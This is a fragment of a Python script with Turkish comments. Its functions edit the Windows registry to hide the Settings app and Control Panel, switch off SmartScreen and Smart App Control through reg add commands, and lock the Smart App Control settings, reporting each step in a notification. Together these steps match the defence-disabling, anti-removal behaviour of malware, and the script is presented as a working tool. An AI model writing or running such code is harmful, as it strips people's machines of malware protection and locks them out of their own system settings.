# 7) AYARLAR + DENETİM MASASI + SMART APP CONTROL KİLİTLE
# ==========================================
def lock_settings():
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        winreg.CreateKey(key, subkey)
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
            winreg.SetValueEx(reg, "NoSettingsUI", 0, winreg.REG_DWORD, 1)
        send_notification("✅ Ayarlar kilitlendi!")
        return True
    except:
        return False

def lock_control_panel():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        winreg.CreateKey(key, subkey)
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
            winreg.SetValueEx(reg, "NoControlPanel", 0, winreg.REG_DWORD, 1)
        send_notification("✅ Denetim Masası kilitlendi!")
        return True
    except:
        return False

def lock_smart_app_control():
    try:
        subprocess.run('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_DWORD /d 0 /f', shell=True)
        subprocess.run('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v EnableSmartScreen /t REG_DWORD /d 0 /f', shell=True)
        subprocess.run('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f', shell=True)
        send_notification("✅ Smart App Control kapatıldı!")
        return True
    except:
        return False

def lock_smart_app_control_settings():
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen"
        winreg.CreateKey(key, subkey)
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
            winreg.SetValueEx(reg, "ConfigureAppInstallControlEnabled", 0, winreg.REG_DWORD, 1)
        send_notification("✅ Smart App Control ayarları kilitlendi!")
        return True
    except:
        return False

